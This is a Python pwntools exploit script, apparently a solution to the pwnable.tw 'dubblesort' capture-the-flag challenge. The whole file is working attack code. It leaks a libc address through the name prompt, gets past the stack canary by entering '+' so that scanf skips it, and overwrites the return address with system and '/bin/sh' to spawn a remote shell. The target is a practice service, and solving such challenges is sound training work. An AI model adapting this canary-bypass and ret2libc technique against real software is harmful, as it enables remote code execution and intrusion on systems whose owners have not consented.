from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("dubblesort")
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
else:
	p = remote("chall.pwnable.tw",10101)
	libc = ELF("libc_32.so.6")

def debug():
	gdb.attach(p,"b puts")

def send_number(index,numberlist):
	if numberlist[index] == "a":
		p.sendlineafter("Enter the {index} number : ".format(index=index),"+")
	else:
		p.sendlineafter("Enter the {index} number : ".format(index=index),str(numberlist[index]))

#debug()
context.log_level = "debug"
p.sendafter("What your name :","a"*(0x18) + "b")
p.recvuntil("a"*(0x18))
if debug:
	offset = 0xf7fb5000 - 0xf7e03000
else:
	offset = 0x1b0000
libc.address = u32(p.recv(4)) - 0x62 - offset
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
offset = 0x80 + 4 + 12 - 4
number = offset / 4
print "number",number
p.sendlineafter("many numbers do you what to sort :",str(number))
numberlist = []
for i in range(24):
	numberlist.append(0)
numberlist.append("a")
for i in range(9):
	numberlist.append(system_addr)
numberlist.append(binsh)
for i in range(number):
	send_number(i,numberlist)
p.interactive()
